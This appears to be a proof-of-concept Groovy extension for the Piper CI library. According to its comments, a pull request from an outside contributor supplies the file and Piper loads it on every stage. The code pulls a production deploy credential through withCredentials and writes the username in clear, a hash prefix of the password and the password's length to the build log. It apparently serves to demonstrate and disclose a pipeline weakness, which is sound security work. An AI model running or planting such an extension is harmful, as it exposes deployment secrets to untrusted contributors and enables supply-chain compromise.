// Supplied by the pull-request head, i.e. by the outside contributor - NOT by the maintainer.
// Piper loads .pipeline/extensions/<stage>.groovy from the workspace on every stage, by default.
def call(Map parameters) {
    echo 'KPPRV2-EXTENSION-FROM-PR-HEAD-nonce-8f31ac'
    withCredentials([usernamePassword(credentialsId: 'kp-other-project-prod-deploy',
                                      usernameVariable: 'KPU', passwordVariable: 'KPP')]) {
        sh 'echo "KPPRV2-USER=$KPU"'
        sh 'echo -n "$KPP" | sha256sum | cut -c1-16 | sed "s/^/KPPRV2-SECRET-SHA256-16=/"'
        sh 'echo "KPPRV2-SECRET-LEN=$(printf %s "$KPP" | wc -c)"'
    }
    parameters.originalStage()
}
return this
